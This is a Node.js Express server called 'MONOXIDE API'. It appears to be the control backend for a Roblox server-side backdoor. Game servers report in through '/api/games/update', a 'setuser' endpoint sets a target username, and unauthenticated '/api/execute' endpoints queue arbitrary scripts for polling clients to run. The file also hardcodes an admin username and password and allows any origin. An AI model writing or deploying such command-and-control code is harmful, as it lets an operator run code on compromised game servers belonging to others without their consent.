const express = require('express');
const crypto = require('crypto');

const app = express();

// In‑memory stores
const users = {};          // username -> { passwordHash, isAdmin, usedKey }
const keys = {};           // key -> { usedBy: username or null }
const sessions = {};       // token -> username
const gamesMap = {};       // gameId -> { name, placeId, players, servers: [serverId], lastSeen }

function hashPassword(pw) {
    return crypto.createHash('sha256').update(pw).digest('hex');
}

function generateKey() {
    return crypto.randomBytes(12).toString('hex');
}

function authenticate(req, res, next) {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'No token' });
    }
    const token = auth.slice(7);
    const username = sessions[token];
    if (!username) {
        return res.status(401).json({ error: 'Invalid token' });
    }
    req.user = { username, isAdmin: users[username]?.isAdmin || false };
    next();
}

function requireAdmin(req, res, next) {
    if (!req.user.isAdmin) {
        return res.status(403).json({ error: 'Admin only' });
    }
    next();
}

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.text({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Pre‑create admin account
const adminKey = generateKey();
users['tr0llzkidd'] = {
    passwordHash: hashPassword('jgoatman100'),
    isAdmin: true,
    usedKey: adminKey
};
keys[adminKey] = { usedBy: 'tr0llzkidd' };
console.log(`Admin key: ${adminKey}`);

let targetUsername = "";
let latestScript = "";

// Clean up stale servers every 30 seconds
setInterval(() => {
    const now = Date.now();
    for (const gameId in gamesMap) {
        const game = gamesMap[gameId];
        // Remove servers that haven't reported for >30 seconds
        game.servers = game.servers.filter(srv => now - srv.lastSeen < 30000);
        if (game.servers.length === 0) {
            delete gamesMap[gameId];
        }
    }
}, 30000);

// ========== Public endpoints ==========
app.post('/api/register', (req, res) => {
    const { username, password, key } = req.body;
    if (!username || !password || !key) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    if (users[username]) {
        return res.status(400).json({ error: 'Username taken' });
    }
    const keyData = keys[key];
    if (!keyData || keyData.usedBy) {
        return res.status(400).json({ error: 'Invalid or used key' });
    }
    users[username] = {
        passwordHash: hashPassword(password),
        isAdmin: false,
        usedKey: key
    };
    keys[key].usedBy = username;
    res.json({ success: true });
});

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const user = users[username];
    if (!user || user.passwordHash !== hashPassword(password)) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    const token = crypto.randomBytes(20).toString('hex');
    sessions[token] = username;
    res.json({ token, isAdmin: user.isAdmin });
});

app.post('/api/logout', authenticate, (req, res) => {
    delete sessions[req.headers.authorization.slice(7)];
    res.json({ success: true });
});

// ========== Admin endpoints ==========
app.post('/api/admin/generatekey', authenticate, requireAdmin, (req, res) => {
    const newKey = generateKey();
    keys[newKey] = { usedBy: null };
    res.json({ key: newKey });
});

app.get('/api/admin/keys', authenticate, requireAdmin, (req, res) => {
    const keyList = Object.entries(keys).map(([k, v]) => ({
        key: k,
        usedBy: v.usedBy || 'unused'
    }));
    res.json(keyList);
});

// ========== Game data endpoints ==========
app.post('/api/games/update', (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const incomingGames = data.games || [];
        
        incomingGames.forEach(game => {
            if (!game.id) return;
            
            const now = Date.now();
            if (!gamesMap[game.id]) {
                gamesMap[game.id] = {
                    name: game.name,
                    placeId: game.placeId,
                    players: game.players,        // global player count from Roblox API
                    servers: []
                };
            }
            const entry = gamesMap[game.id];
            // Update game info (name might change, etc.)
            entry.name = game.name;
            entry.placeId = game.placeId;
            entry.players = game.players;          // use the global count sent by the server
            // Keep track of this server instance
            const existingServer = entry.servers.find(s => s.id === game.serverId);
            if (existingServer) {
                existingServer.lastSeen = now;
            } else {
                entry.servers.push({
                    id: game.serverId,
                    lastSeen: now
                });
            }
        });
        
        res.send('OK');
    } catch (e) {
        console.error('Error updating games:', e);
        res.status(200).send('OK');
    }
});

app.get('/api/games', (req, res) => {
    const gamesList = Object.values(gamesMap).map(game => ({
        id: Object.keys(gamesMap).find(k => gamesMap[k] === game), // crude, but works
        name: game.name,
        placeId: game.placeId,
        players: game.players,          // this is already the global total
        servers: game.servers.length
    }));
    
    res.json({
        total: gamesList.length,
        players: gamesList.reduce((sum, g) => sum + (g.players || 0), 0),
        games: gamesList
    });
});

// ========== Settings / GUI endpoints ==========
app.post('/api/setuser', (req, res) => {
    targetUsername = req.body || "";
    res.send('OK');
});

app.get('/api/getuser', (req, res) => {
    res.send(targetUsername);
});

// ========== Executor endpoints ==========
app.post('/api/execute', (req, res) => {
    latestScript = req.body || "";
    res.send('OK');
});

app.get('/api/execute', (req, res) => {
    res.send(latestScript);
    latestScript = "";
});

// ========== Test endpoint ==========
app.get('/api/test', (req, res) => {
    res.json({ status: 'online', games: Object.keys(gamesMap).length, target: targetUsername });
});

app.get('/', (req, res) => {
    res.send('MONOXIDE API Running');
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server running on port ${port}`));
